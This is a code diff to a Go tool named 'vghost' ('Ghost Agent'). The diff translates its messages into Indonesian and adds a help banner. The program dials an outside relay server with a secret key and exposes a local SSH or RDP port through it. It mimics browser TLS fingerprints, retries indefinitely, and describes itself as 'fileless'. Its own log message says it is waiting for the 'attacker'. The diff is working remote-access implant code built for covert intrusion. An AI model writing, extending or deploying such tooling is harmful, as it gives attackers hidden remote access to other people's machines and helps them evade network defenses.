@@ -16,20 +16,50 @@ import (
 )
 
 var (
-	secretKey  = flag.String("Sk", "", "Secret key")
-	domain     = flag.String("d", "", "Relay domain/IP")
-	relayPort  = flag.String("P", "443", "Relay port")
-	localPort  = flag.String("p", "22", "Local port to expose")
-	mimic      = flag.String("mimic", "chrome", "Browser profile")
-	noTLS      = flag.Bool("no-tls", false, "Disable TLS")
-	retryMax   = flag.Int("retry", 0, "Max retries (0=infinite)")
-	retryDelay = flag.Int("retry-delay", 5, "Retry delay sec")
+	secretKey  = flag.String("Sk", "", "Secret key untuk otentikasi (wajib)")
+	domain     = flag.String("d", "", "Domain atau IP relay server (wajib)")
+	relayPort  = flag.String("P", "443", "Port relay server")
+	localPort  = flag.String("p", "22", "Port lokal yang akan diekspos")
+	mimic      = flag.String("mimic", "chrome", "Profil browser untuk TLS mimicry (chrome, firefox, safari, edge)")
+	noTLS      = flag.Bool("no-tls", false, "Matikan TLS (untuk testing)")
+	retryMax   = flag.Int("retry", 0, "Maksimum percobaan koneksi ulang (0 = tak terbatas)")
+	retryDelay = flag.Int("retry-delay", 5, "Delay antar percobaan dalam detik")
+	help       = flag.Bool("h", false, "Tampilkan bantuan")
 )
+
+func printHelp() {
+	fmt.Println(`
+██╗   ██╗ ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗
+██║   ██║██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝
+██║   ██║██║  ███╗███████║██║   ██║███████╗   ██║   
+╚██╗ ██╔╝██║   ██║██╔══██║██║   ██║╚════██║   ██║   
+ ╚████╔╝ ╚██████╔╝██║  ██║╚██████╔╝███████║   ██║   
+  ╚═══╝   ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   
+
+Ghost Agent - Menghubungkan port lokal ke relay server secara fileless.
+`)
+	fmt.Println("Penggunaan:")
+	fmt.Println("  vghost --Sk <secret> -d <domain> [opsi]")
+	fmt.Println()
+	fmt.Println("Opsi:")
+	flag.PrintDefaults()
+	fmt.Println()
+	fmt.Println("Contoh:")
+	fmt.Println("  vghost --Sk abc123 -d namadomain.com")
+	fmt.Println("  vghost --Sk abc123 -d namadomain.com -p 3389 --mimic firefox")
+	fmt.Println()
+}
 
 func main() {
 	flag.Parse()
+
+	if *help {
+		printHelp()
+		return
+	}
+
 	if *secretKey == "" || *domain == "" {
-		fmt.Fprintf(os.Stderr, "Usage: vghost --Sk <secret> -d <domain>\n")
+		fmt.Fprintf(os.Stderr, "Error: --Sk dan -d harus diisi. Gunakan -h untuk bantuan.\n")
 		os.Exit(1)
 	}
 
@@ -54,7 +84,7 @@ func main() {
 	retries := 0
 
 	for {
-		log.Printf("Connecting to %s (attempt %d)", addr, retries+1)
+		log.Printf("Menghubungkan ke %s (percobaan ke-%d)", addr, retries+1)
 
 		var conn net.Conn
 		if *noTLS {
@@ -63,21 +93,21 @@ func main() {
 			conn, err = evMgr.DialContext(context.Background(), "tcp", addr)
 		}
 		if err != nil {
-			log.Printf("Dial failed: %v", err)
+			log.Printf("Gagal menghubungi relay: %v", err)
 			retries++
 			if *retryMax > 0 && retries >= *retryMax {
-				log.Fatal("Max retries reached")
+				log.Fatal("Batas maksimum percobaan tercapai.")
 			}
 			time.Sleep(time.Duration(*retryDelay) * time.Second)
 			continue
 		}
 
 		fmt.Fprintf(conn, "%s\n", *secretKey)
-		log.Printf("Connected, waiting for peer...")
+		log.Printf("Terhubung ke relay, menunggu pasangan (attacker)...")
 
 		localConn, err := net.DialTimeout("tcp", net.JoinHostPort("127.0.0.1", *localPort), 10*time.Second)
 		if err != nil {
-			log.Printf("Local service unreachable: %v", err)
+			log.Printf("Layanan lokal di port %s tidak dapat dijangkau: %v", *localPort, err)
 			conn.Close()
 			time.Sleep(time.Duration(*retryDelay) * time.Second)
 			continue
@@ -87,7 +117,7 @@ func main() {
 		io.Copy(conn, localConn)
 		localConn.Close()
 		conn.Close()
-		log.Printf("Connection closed, reconnecting...")
+		log.Printf("Koneksi terputus, mencoba lagi...")
 		retries = 0
 		time.Sleep(1 * time.Second)
 	}
